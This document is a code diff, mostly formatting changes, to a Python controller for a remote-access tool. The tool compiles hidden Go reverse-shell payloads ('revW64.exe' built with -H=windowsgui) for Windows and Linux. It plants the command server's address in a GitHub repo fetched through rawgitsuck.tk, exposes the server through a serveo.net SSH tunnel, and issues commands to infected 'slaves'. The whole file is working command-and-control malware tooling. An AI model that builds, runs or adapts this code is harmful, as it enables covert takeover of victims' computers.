@@ -13,24 +13,31 @@ try:
     import string
     from shutil import copy2
     from pathlib import Path
+    from pyngrok import ngrok
 except:
     os.system("python3 -m pip install Gitpython")
     os.system("python3 -m pip install termcolor")
+    os.system("python3 -m pip install pyngrok")
     try:
         from git import Repo
         from termcolor import colored
-        #from pyngrok import ngrok
+        from pyngrok import ngrok
     except:
         os.system("pip3 install Gitpython")
         os.system("pip3 install termcolor")
+        os.system("pip3 install pyngrok")
         from git import Repo
         from termcolor import colored
+        from pyngrok import ngrok
+
         print("Run me again! :)")
         sys.exit()
 
 repox = ""
 urix = ""
 comx = ""
+
+
 def banner(lastupdate):
     banner = f"""
        (
@@ -45,14 +52,16 @@ def banner(lastupdate):
                `'-.\~~~~~~~~~~~~~~~~~~~~~~\\\\\\\\\\"""
     return banner
 
+
 if os.name == "nt":
     homedir = str(Path.home())
 else:
     homedir = str(os.environ['HOME'])
 
+
 def killx():
-    printfc("stopping the server!","red")
-    f = open("exit.asw","w+")
+    printfc("stopping the server!", "red")
+    f = open("exit.asw", "w+")
     f.close()
     if os.name == "nt":
         pass
@@ -62,6 +71,7 @@ def killx():
             os.remove("script1337.sh")
         except:
             pass
+
 
 def linx():
     if os.name == "nt":
@@ -77,12 +87,13 @@ def checks():
     else:
         os.makedirs("data")
 
+
 def setup(repo, url):
     if os.path.isdir(repo):
         pass
     else:
         os.remove("config.json")
-        printfc("Repo not found!","red")
+        printfc("Repo not found!", "red")
         killx()
         sys.exit()
     os.system("echo " + url + " > " + "." + linx() + repo + linx() + "urlx.txt")
@@ -94,9 +105,9 @@ def setup(repo, url):
     try:
         origin.push()
     except:
-        printfc("Authentication failed!" ,"red")
-        #os.removedirs(str(repo))
-        #os.remove("config.json")
+        printfc("Authentication failed!", "red")
+        # os.removedirs(str(repo))
+        # os.remove("config.json")
         killx()
         sys.exit()
 
@@ -133,13 +144,13 @@ def read():
             with open("response.txt", "r") as file:
                 data = file.read()
                 file.close()
-                response = data.replace("\n\n","\n")
+                response = data.replace("\n\n", "\n")
                 res = os.stat("response.txt")
                 if res.st_size == 0:
                     os.remove("response.txt")
-                elif data.replace(" ","") == "":
+                elif data.replace(" ", "") == "":
                     continue
-                elif data.replace("\n","") == "":
+                elif data.replace("\n", "") == "":
                     continue
                 else:
                     print("\n")
@@ -148,6 +159,7 @@ def read():
                     os.remove("response.txt")
         except:
             pass
+
 
 def checkbuildingconf():
     global homedir
@@ -161,23 +173,26 @@ def checkbuildingconf():
                 revfile = os.path.isfile(rev)
                 winrevfile = os.path.isfile(winrev)
                 if revfile and winrevfile:
-                    printfc("Everythink looking good","green")
+                    printfc("Everythink looking good", "green")
                     return True
                 else:
-                    copy2("." + linx() + "source" + linx() + "rev.go", homedir + linx() + "go" + linx() + "src" + linx() + "rev")
-                    copy2("." + linx() + "source" + linx() + "winrev.go", homedir + linx() + "go" + linx() + "src" + linx() + "rev")
+                    copy2("." + linx() + "source" + linx() + "rev.go",
+                          homedir + linx() + "go" + linx() + "src" + linx() + "rev")
+                    copy2("." + linx() + "source" + linx() + "winrev.go",
+                          homedir + linx() + "go" + linx() + "src" + linx() + "rev")
                     return True
             else:
                 os.makedirs(str(homedir) + linx() + "go" + linx() + "src")
                 return True
         else:
-            printfc("Failed to build","red")
-            printfc("Go path is not set!","red")
+            printfc("Failed to build", "red")
+            printfc("Go path is not set!", "red")
             return False
     else:
-        printfc("please install go!","red")
-        printfc("Go is not installed!","red")
+        printfc("please install go!", "red")
+        printfc("Go is not installed!", "red")
         return False
+
 
 def rawtogit(s):
     str1 = ""
@@ -190,38 +205,42 @@ def rawtogit(s):
         z = z + 1
     return str1
 
+
 def animation():
     global comx
-    printfc("Compiling:","cyan")
-    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
+    printfc("Compiling:", "cyan")
+    animation = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]",
+                 "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
 
     for i in range(len(animation)):
         sleep(0.2)
         sys.stdout.write(colored("\r" + animation[i % len(animation)], 'red'))
         sys.stdout.flush()
     if comx != "":
-        printfc("\n"+comx,"red")
+        printfc("\n" + comx, "red")
         sys.exit()
 
+
 def callanimation():
-    the_process = threading.Thread( target=animation)
-    the_process.start() 
+    the_process = threading.Thread(target=animation)
+    the_process.start()
     return the_process
 
+
 def writeonrev(option):
-    global repo,homedir,repox
+    global repo, homedir, repox
     line_to_replace = 44
     if repox == "":
-        git = repo.replace("https://github.com" , "https://raw.githubusercontent.com").split("/")
+        git = repo.replace("https://github.com", "https://raw.githubusercontent.com").split("/")
     else:
-        git = repox.replace("https://github.com" , "https://raw.githubusercontent.com").split("/")
+        git = repox.replace("https://github.com", "https://raw.githubusercontent.com").split("/")
     git[1] = "//"
     if rawtogit(git).endswith(".git"):
-        rawgit =  "http://rawgitsuck.tk/raw?git=" + rawtogit(git)[:-4] + "/master/urlx.txt"
+        rawgit = "http://rawgitsuck.tk/raw?git=" + rawtogit(git)[:-4] + "/master/urlx.txt"
     else:
-        rawgit =  "http://rawgitsuck.tk/raw?git=" + rawtogit(git) + "/master/urlx.txt"
-    text = 	"""\turlx, _ := reciver(string("{rawgit}"))""".format(rawgit=rawgit)
-    printfc( "###UrL Resolver set to >>> " + str(rawgit),"green")
+        rawgit = "http://rawgitsuck.tk/raw?git=" + rawtogit(git) + "/master/urlx.txt"
+    text = """\turlx, _ := reciver(string("{rawgit}"))""".format(rawgit=rawgit)
+    printfc("###UrL Resolver set to >>> " + str(rawgit), "green")
     if option == 3 or option == 4:
         rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
     else:
@@ -233,16 +252,17 @@ def writeonrev(option):
     with open(rev, 'w') as file:
         file.writelines(lines)
 
+
 def builder():
-    global comx,homedir
+    global comx, homedir
     rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
     winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
     if checkbuildingconf():
-        printfc("###Select os and arch >>> ","green")
-        printfc("#1.Windows 64","cyan")
-        printfc("#2.Windows 32","cyan")
-        printfc("#3.linux 64","cyan")
-        printfc("#4.linux 32","cyan")
+        printfc("###Select os and arch >>> ", "green")
+        printfc("#1.Windows 64", "cyan")
+        printfc("#2.Windows 32", "cyan")
+        printfc("#3.linux 64", "cyan")
+        printfc("#4.linux 32", "cyan")
         print(colored("#app::builder>  ", 'yellow'), end="")
         try:
             options = int(input(""))
@@ -255,47 +275,58 @@ def builder():
         try:
             writeonrev(options)
             if options == 1:
-                printfc("###Start compiling the payload >>> ","yellow")
+                printfc("###Start compiling the payload >>> ", "yellow")
                 com = callanimation()
                 if win:
-                    subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW64.exe "' + winrev, shell=True)
+                    subprocess.call(
+                        'powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW64.exe "' + winrev,
+                        shell=True)
                 else:
-                    os.system("env GOOS=windows GOARCH=amd64 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW64.exe " + winrev)
-                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW64.exe")
+                    os.system(
+                        "env GOOS=windows GOARCH=amd64 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW64.exe " + winrev)
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd() + linx() + "revW64.exe")
                 com.join()
             elif options == 2:
-                printfc("###Start compiling the payload >>> ","yellow")
+                printfc("###Start compiling the payload >>> ", "yellow")
                 com = callanimation()
                 if win:
-                    subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW32.exe "' + winrev, shell=True)
+                    subprocess.call(
+                        'powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW32.exe "' + winrev,
+                        shell=True)
                 else:
-                    os.system("env GOOS=windows GOARCH=386 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW32.exe " + winrev)
-                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW32.exe")
+                    os.system(
+                        "env GOOS=windows GOARCH=386 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW32.exe " + winrev)
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd() + linx() + "revW32.exe")
                 com.join()
             elif options == 3:
-                printfc("###Start compiling the payload >>> ","yellow")
+                printfc("###Start compiling the payload >>> ", "yellow")
                 com = callanimation()
                 if win:
-                    subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -o revL64 "' + rev, shell=True)
+                    subprocess.call(
+                        'powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -o revL64 "' + rev,
+                        shell=True)
                 else:
                     os.system("env GOOS=linux GOARCH=amd64 go build -ldflags \"-s -w\" -o revL64 " + rev)
-                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL64")
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd() + linx() + "revL64")
                 com.join()
             elif options == 4:
-                printfc("###Start compiling the payload >>> ","yellow")
+                printfc("###Start compiling the payload >>> ", "yellow")
                 com = callanimation()
                 if win:
-                    subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -o revL32 "' + rev, shell=True)
+                    subprocess.call(
+                        'powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -o revL32 "' + rev,
+                        shell=True)
                 else:
                     os.system("env GOOS=linux GOARCH=386 go build -ldflags \"-s -w\" -o revL32 " + rev)
-                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL32")
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd() + linx() + "revL32")
                 com.join()
             else:
-                printfc("Please select a valid option","red")
+                printfc("Please select a valid option", "red")
         except:
-            printfc("Please select a valid option","red")
+            printfc("Please select a valid option", "red")
     else:
         pass
+
 
 def helper():
     help = """
@@ -314,7 +345,8 @@ def helper():
             
     }}
     """
-    printfc(help , "red")
+    printfc(help, "red")
+
 
 def sendcommand():
     global urix
@@ -335,7 +367,7 @@ def sendcommand():
                         printfc(user.read(), "cyan")
                         user.close()
                 except:
-                    printfc("No slaves are found!","red")
+                    printfc("No slaves are found!", "red")
             elif command[1] == "quit":
                 printfc("\ngoodbye", "red")
                 killx()
@@ -378,7 +410,7 @@ def setconfig():
     repo = repourl.split("/")
     try:
         if os.name == "nt":
-            subprocess.run('RD /S /Q ' + repo[4],shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            subprocess.run('RD /S /Q ' + repo[4], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         else:
             os.system("rm -rf " + repo[4])
         printfc("old repo get removed", "yellow")
@@ -407,6 +439,7 @@ def setconfig():
     repox = repourl
     return True
 
+
 def randomString(stringLength=32):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for i in range(stringLength))
@@ -417,12 +450,13 @@ def createtunnel():
     domain = str(randomString(32))
     urix = "https://" + domain + ".serveousercontent.com"
     if os.name == "nt":
-        os.system("start /min ssh -R "+domain+":80:127.0.0.1:5000 serveo.net &")
+        os.system("start /min ssh -R " + domain + ":80:127.0.0.1:5000 serveo.net &")
     else:
-        os.system("echo 'ssh -R "+domain+":80:localhost:5000 serveo.net' > script1337.sh")
+        os.system("echo 'ssh -R " + domain + ":80:localhost:5000 serveo.net' > script1337.sh")
         os.system("chmod +x script1337.sh")
         os.system("screen -d -m bash script1337.sh")
-     
+
+
 def startserver():
     try:
         os.remove("exit.asw")
@@ -433,10 +467,11 @@ def startserver():
     else:
         os.system("nohup python3 server.py >/dev/null 2>&1 &")
 
+
 if __name__ == '__main__':
     if os.name == "nt":
         os.system('color')
-    printfc("Starting the server!","green")
+    printfc("Starting the server!", "green")
     createtunnel()
     startserver()
     repo = ""
@@ -444,17 +479,17 @@ if __name__ == '__main__':
         try:
             with open("config.json", "r") as config:
                 conf = json.loads(config.read())
-                #print(conf)
+                # print(conf)
                 repo = conf["repo"]
                 lastupdate = conf["lastupdate"]
                 config.close()
                 printfc(banner(lastupdate), "cyan")
-                printfc("public_url >>> " + urix,"green")
+                printfc("public_url >>> " + urix, "green")
         except FileNotFoundError:
             printfc(banner(str(date.today())), "cyan")
             if setconfig():
                 printfc("Config generated successfully!", "green")
-                printfc("public_url >>> " + urix,"green")
+                printfc("public_url >>> " + urix, "green")
         checks()
         try:
             setup(repo.split("/")[4], urix)
@@ -462,16 +497,14 @@ if __name__ == '__main__':
             try:
                 setup(repox.split("/")[4], urix)
             except  Exception as e:
-                printfc("Run me again!","yellow")
+                printfc("Run me again!", "yellow")
                 sys.exit()
         tr = threading.Thread(target=read)
         tr.daemon = True
         tr.start()
-        printfc("###run app::help to see all options >>>","magenta")
+        printfc("###run app::help to see all options >>>", "magenta")
         sendcommand()
     except KeyboardInterrupt:
         printfc("\ngoodbye", "red")
         killx()
         sys.exit()
-
-
